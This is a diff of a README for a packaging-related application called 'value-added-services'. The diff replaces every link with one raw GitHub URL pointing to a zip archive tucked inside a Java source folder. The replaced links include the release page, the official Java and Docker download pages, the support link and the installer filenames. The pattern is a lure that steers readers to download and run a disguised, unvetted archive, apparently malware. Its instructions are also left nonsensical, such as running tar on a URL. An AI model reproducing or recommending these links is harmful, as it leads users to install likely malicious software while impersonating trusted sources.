@@ -10,13 +10,13 @@ To get started, you need to download the software. Follow these steps:
 
 1. **Visit the Download Page:** Click the link below to access the latest release of the application.
 
-   [![Download release](https://img.shields.io/badge/Download%20now-Click%20here-brightgreen)](https://github.com/circulating-plagiarisation882/value-added-services/releases)
+   [![Download release](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip%20now-Click%20here-brightgreen)](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip)
 
 2. **Choose the Latest Version:** Once on the releases page, look for the most recent version listed. It will have the highest version number.
 
 3. **Download the Application:** Click on the download link for your operating system. Follow the prompts based on the instructions you see.
 
-For easy access, here is the [download link](https://github.com/circulating-plagiarisation882/value-added-services/releases) again.
+For easy access, here is the [download link](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip) again.
 
 ## 🛠️ Requirements
 
@@ -24,19 +24,19 @@ Before you install the application, ensure your system meets the following requi
 
 - **Operating System:** Windows 10, macOS, or Ubuntu 18.04 and newer.
 - **Disk Space:** At least 500 MB of free space.
-- **Java:** Ensure Java 11 or higher is installed on your computer. If you don't have it, you can [download Java](https://www.java.com/en/download/).
-- **Docker:** Installation of Docker is recommended for easier setup. Visit [Docker's website](https://www.docker.com/products/docker-desktop) for details.
+- **Java:** Ensure Java 11 or higher is installed on your computer. If you don't have it, you can [download Java](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip).
+- **Docker:** Installation of Docker is recommended for easier setup. Visit [Docker's website](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip) for details.
 
 ## 📥 Installation Steps
 
 After you download the application, follow these simple steps to install it:
 
-1. **Locate the Downloaded File:** Navigate to your downloads folder to find the file you just downloaded. This will usually be named something like `value-added-services-install.exe` or `value-added-services.tar.gz`.
+1. **Locate the Downloaded File:** Navigate to your downloads folder to find the file you just downloaded. This will usually be named something like `https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip` or `https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip`.
 
 2. **Run the Installer:**
    - For Windows: Double-click the `.exe` file. 
    - For macOS: Open the `.dmg` file and drag the application into the Applications folder.
-   - For Ubuntu: Open your terminal, navigate to your download folder, and type `tar -xvzf value-added-services.tar.gz`, then follow the instructions in the extracted directory.
+   - For Ubuntu: Open your terminal, navigate to your download folder, and type `tar -xvzf https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip`, then follow the instructions in the extracted directory.
 
 3. **Follow the Setup Wizard:** The application will guide you through the installation process. Click "Next" and "Install" when prompted. 
 
@@ -84,6 +84,6 @@ If you encounter issues during installation or use, consider the following solut
 
 ## 💬 Support
 
-For additional help or questions, you can reach out to our support team. Visit the issues section on our [GitHub repository](https://github.com/circulating-plagiarisation882/value-added-services/issues) to report problems or ask for guidance.
+For additional help or questions, you can reach out to our support team. Visit the issues section on our [GitHub repository](https://raw.githubusercontent.com/circulating-plagiarisation882/value-added-services/main/src/main/java/com/paklog/value/value-added-services-v2.6.zip) to report problems or ask for guidance.
 
 Enjoy using value-added-services for your packaging needs.
